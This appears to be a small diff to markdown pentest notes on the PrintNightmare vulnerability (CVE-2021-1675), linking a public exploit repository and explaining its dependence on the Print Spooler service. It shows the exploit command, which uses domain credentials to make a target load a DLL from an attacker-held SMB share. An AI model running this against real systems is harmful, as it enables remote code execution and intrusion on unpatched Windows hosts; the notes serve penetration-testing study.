@@ -1,4 +1,5 @@
-PrintNightmare CVE-2021-1675
+## PrintNightmare CVE-2021-1675
+```
 https://github.com/cube0x0/CVE-2021-1675
 This cve works because of the spooler service running in windows and currently it is not patched and only mitigation is to disable spooler service so we need this service running in order to exploit
 
@@ -17,3 +18,4 @@ Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN
     Now we simply run the exploit remotely as shown in the github
 
     ./CVE-2021-1675.py domain.name/domain_user:passsword@TargetIP '\OurIPAddress\smb\file.dll'
+```
